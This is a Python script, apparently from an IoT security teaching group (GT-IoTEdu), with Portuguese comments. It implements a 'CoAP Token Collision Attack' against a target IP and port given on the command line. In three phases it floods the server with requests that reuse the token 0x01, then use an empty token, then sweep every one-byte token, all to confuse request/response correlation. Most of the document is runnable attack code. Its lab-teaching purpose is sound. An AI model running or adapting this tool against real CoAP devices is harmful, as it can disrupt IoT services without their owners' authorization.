#!/usr/bin/env python3
"""
CoAP Token Collision Attack
Força colisões de tokens para confundir servidor
Para fins educacionais - GT-IoTEdu
"""

import asyncio
import sys
import time
from aiocoap import *
from aiocoap.numbers.codes import Code

attack_stats = {
    'requests_sent': 0,
    'collisions_forced': 0,
    'responses_received': 0,
    'errors': 0
}

class TokenCollisionAttacker:
    def __init__(self, target_host, target_port):
        self.target = f"coap://{target_host}:{target_port}"
    
    async def send_request_with_token(self, request_id, resource, token_bytes):
        """Envia request com token específico"""
        try:
            protocol = await Context.create_client_context()
            
            uri = f"{self.target}{resource}"
            request = Message(code=GET, uri=uri)
            
            # FORÇA uso de token específico
            request.token = token_bytes
            
            print(f"[*] Request {request_id:04d}: Token={token_bytes.hex()} → {resource}")
            
            response = await protocol.request(request).response
            
            attack_stats['requests_sent'] += 1
            attack_stats['responses_received'] += 1
            
            print(f"[✓] Response {request_id:04d}: {response.code} | Payload={response.payload[:30]}")
            
        except Exception as e:
            attack_stats['errors'] += 1
            print(f"[✗] Error request {request_id}: {e}")
    
    async def token_collision_attack(self, collision_token, num_requests, resources):
        """Força colisão enviando múltiplos requests com mesmo token"""
        
        print(f"\n[!] Forçando {num_requests} requests com Token={collision_token.hex()}")
        print(f"[!] Servidor terá que correlacionar {num_requests} responses ao mesmo token!\n")
        
        tasks = []
        for i in range(num_requests):
            resource = resources[i % len(resources)]
            task = self.send_request_with_token(i, resource, collision_token)
            tasks.append(task)
            await asyncio.sleep(0.01)  # Pequeno delay
        
        await asyncio.gather(*tasks, return_exceptions=True)
        
        attack_stats['collisions_forced'] += 1
    
    async def exhaustive_token_space_attack(self, resources):
        """Testa todo o espaço de tokens pequenos (1 byte)"""
        
        print("\n[*] Testando espaço completo de tokens de 1 byte (0x00-0xFF)...\n")
        
        tasks = []
        for token_value in range(256):
            token_bytes = bytes([token_value])
            resource = resources[token_value % len(resources)]
            task = self.send_request_with_token(token_value, resource, token_bytes)
            tasks.append(task)
            
            if len(tasks) >= 50:  # Batches de 50
                await asyncio.gather(*tasks, return_exceptions=True)
                tasks.clear()
                await asyncio.sleep(0.5)
        
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
    
    async def launch_attack(self):
        """Lança ataque completo de token collision"""
        
        resources = [
            "/sensor/temp",
            "/sensor/humidity",
            "/actuator/led",
            "/status",
            "/.well-known/core",
        ]
        
        print("\n[*] Iniciando CoAP Token Collision Attack...\n")
        
        # Fase 1: Colisão massiva com token 0x01
        collision_token = b'\x01'
        await self.token_collision_attack(collision_token, 100, resources)
        
        await asyncio.sleep(2)
        
        # Fase 2: Colisão com token vazio (0 bytes)
        print("\n[*] Fase 2: Token vazio (0 bytes)")
        collision_token = b''
        await self.token_collision_attack(collision_token, 50, resources)
        
        await asyncio.sleep(2)
        
        # Fase 3: Varredura completa do espaço de tokens
        print("\n[*] Fase 3: Varredura completa (0x00-0xFF)")
        await self.exhaustive_token_space_attack(resources)
        
        print("\n" + "=" * 70)
        print("[✓] CoAP Token Collision Attack Completado!")
        print("=" * 70)
        print(f"[✓] Requests enviados: {attack_stats['requests_sent']}")
        print(f"[✓] Colisões forçadas: {attack_stats['collisions_forced']}")
        print(f"[✓] Responses recebidas: {attack_stats['responses_received']}")
        print(f"[✗] Erros: {attack_stats['errors']}")
        print("=" * 70)

async def main():
    if len(sys.argv) < 3:
        print("Uso: python3 attack.py <target_ip> <target_port>")
        sys.exit(1)
    
    target_host = sys.argv[1]
    target_port = int(sys.argv[2])
    
    print("=" * 70)
    print("  CoAP TOKEN COLLISION ATTACK - Educational Purpose Only")
    print("  GT-IoTEdu - Grupo de Trabalho IoT Educacional")
    print("=" * 70)
    print(f"[*] Alvo: {target_host}:{target_port}")
    print(f"[*] Técnica: Token Collision & Space Exhaustion")
    print(f"[*] Objetivo: Confundir correlação request/response")
    print(f"[*] Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 70)
    
    attacker = TokenCollisionAttacker(target_host, target_port)
    await attacker.launch_attack()

if __name__ == "__main__":
    asyncio.run(main())